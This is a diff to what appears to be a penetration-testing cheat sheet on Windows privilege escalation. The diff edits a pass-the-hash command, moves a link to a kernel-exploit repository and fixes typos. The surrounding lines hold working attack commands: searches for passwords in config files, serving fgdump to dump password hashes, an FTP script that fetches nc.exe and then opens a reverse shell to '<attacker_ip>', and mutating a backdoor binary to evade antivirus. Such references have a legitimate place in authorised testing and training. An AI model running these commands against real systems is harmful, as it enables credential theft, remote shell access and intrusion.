@@ -108,7 +108,7 @@ findstr /si password *.ini*
     Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
     * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
     Download and run fgdump.exe on the target machine.
-    *$ pth-winexe -U hash //$ip cmd*
+    *$ pth-winexe -U DOMAIN/user%hash //$ip cmd*
 
     Find all those strings in config files.
     *$dir /s *pass* == *cred* == *vnc* == *.config**
@@ -262,6 +262,8 @@ MS11-046	    KB2503665    Windows Server 2003, Windows Server 2008, 7, XP*
 MS10-059 (KB982799)
 MS10-021 (KB979683)
 MS11-080 (KB2592799)*
+    Exploits worth looking at: MS11-046
+    *https://github.com/SecWiki/windows-kernel-exploits*
 
 Windows version map
     *Operating System     Version Number
@@ -285,9 +287,6 @@ Windows 7                      6.1.7600
 Windows 8.1                    6.3.9600
 Windows 10                     10.0.10240*
 
-Exploits worth looking at:
-    MS11-046
-    *https://github.com/SecWiki/windows-kernel-exploits*
 
 EoP8: Automated tools
 
@@ -354,8 +353,8 @@ echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 nc.exe <attacker_ip> 1234 -e cmd.exe*
-    Bounce port sannning
-    *$ $ nc $ip 21
+    Bounce port sanning
+    *$ nc $ip 21
 220 Femitter FTP Server ready.
 USER anonymous
 331 Password required for anonymous.
@@ -409,7 +408,7 @@ AV bypass
     Generating a mutated binary to bypass antiviruses
     *$ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe*
 
-Get proof
+Print proof
     *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"*
 
 Access Check
